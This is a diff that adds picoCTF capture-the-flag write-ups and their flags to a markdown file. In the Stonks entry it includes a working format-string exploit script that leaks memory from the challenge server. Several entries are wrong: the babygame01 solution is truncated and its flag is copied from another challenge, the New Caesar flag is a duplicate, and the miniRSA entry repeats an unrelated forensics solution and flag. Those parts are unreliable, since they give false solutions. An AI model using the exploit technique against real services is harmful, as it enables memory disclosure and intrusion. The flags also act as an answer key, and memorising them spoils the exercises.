@@ -53,7 +53,7 @@ I compiled the program using the ARMv8 cross compiler suite provided by GNU thro
 
 ## GDB Baby Step 1
 ### Solution
-I loaded the given file in the `gdb	` debugger and disassembled `main`, which revealed that the value `0x86342` was stored in `eax` at the end of the program, which I explicitly converted into the `int` data type using `py`
+I loaded the given file in the `gdb	` debugger and disassembled `main`, which revealed that the value `0x86342` was stored in `eax` at the end of the program, which I explicitly converted into the `int` data type using `python3` and found the required flag.
 
 ### Flag
 `picoCTF{549698}`
@@ -61,3 +61,111 @@ I loaded the given file in the `gdb	` debugger and disassembled `main`, which re
 
 
 # Forensics
+
+## tunn3l v1s10n
+### Solution
+I could not open the BMP file directly so I figured that the header was broken. After loading it in a hex editor, I looked up the reference to figure out that offset `16` had to be edited and after replacing the existing height `32 01` with `6e 04`, I loaded the image in `photopea` and could see the flag written on the image.
+
+### Flag
+`picoCTF{qu1t3_a_v13w_2020}`
+
+
+## MacroHard WeakEdge
+### Solution
+I knew that `PPT` files are compressed files themselves, so I unzipped the given file and manually navigated through the extracted directories. I eventually found `/ppt/slideMasters/hidden` and `cat`ed it to reveal its contents, which on decoding from `Base64`, gave the required flag.
+
+### Flag
+`picoCTF{D1d_u_kn0w_ppts_r_z1p5}`
+
+
+## Trivial Flag Transfer Protocol
+### Solution
+On opening the given file with wireshark, I first exported the exchanged files and decided to read each one of them. I deciphered `instructions.txt` first, realising that it was a `ROT13` cipher and hence, similarly, decoded `plan` to reveal that the `DUEDILIGENCE	` 	was some sort of a password. I decided to use `steghide` on every exported image in the directory and finally found the required flag in `picture3.bmp`.
+
+### Flag
+`picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}`
+
+
+
+# Binary Exploitation
+
+## Stonks
+### Solution
+I figured out that since the program simply returned the same input string to the user, it could provide access to the remote memory and it was vulnerable to a [format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string). I tested this by passing `%x.%x.%x` which did give me the values of some variables and after some trial and error, I figured that the flag starts at the 15th memory location. From then, retrieving the required flag was a simple exploit script away:
+```
+from pwn import *
+
+flag = b''
+for i in range(15, 22):
+    with context.local(log_level = "error"):
+        r = remote("mercury.picoctf.net", 21973)
+        r.sendlineafter("What would you like to do?\n", "1")
+        r.sendlineafter("What is your API token?\n", f"%{i}$p")
+        r.recvuntilS("Buying stonks with token:\n")
+        out = r.recvline()
+        try:
+            res = p32(int(out.decode(), 16))
+            flag += res
+        except Exception:
+            pass
+        r.recvall()
+
+print(flag)
+```
+
+### Flag
+`picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}`
+
+
+## buffer overflow 0
+### Solution
+Upon inspection of the source file, I found that the `strcpy` used a 100-long buffer that can be controlled by the user. My first instinct was to enter a longer string and see if it will leak anything, and it worked.
+
+### Flag
+`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`
+
+
+## babygame01
+### Solution
+I basically just won the game by reaching the end tile first by spamming `w`, then I proceeded
+
+### Flag
+`picoCTF{D1d_u_kn0w_ppts_r_z1p5}`
+
+
+
+# Cryptography
+
+## New Caesar
+### Solution
+I just reversed the encoding mechanism in the given python script and experimented with the offsets, which eventually gave the required flag.
+
+### Flag
+`picoCTF{qu1t3_a_v13w_2020}`
+
+
+## basic-mod1
+### Solution
+I wrote a script that performed operations as per the given instructions
+```
+from string import ascii_uppercase
+x = [165, 248, 94, 346, 299, 73, 198, 221, 313, 137, 205, 87, 336, 110, 186, 69, 223, 213, 216, 216, 177, 138]
+
+
+a = ascii_uppercase + "0123456789_"
+
+for i in x:
+    print(a[i % 37], end="")
+```
+    
+`
+### Flag
+`R0UND_N_R0UND_B6B25531`
+
+
+## miniRSA
+### Solution
+On opening the given file with wireshark, I first exported the exchanged files and decided to read each one of them. I deciphered `instructions.txt` first, realising that it was a `ROT13` cipher and hence, similarly, decoded `plan` to reveal that the `DUEDILIGENCE	` 	was some sort of a password. I decided to use `steghide` on every exported image in the directory and finally found the required flag in `picture3.bmp`.
+
+### Flag
+`picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}`
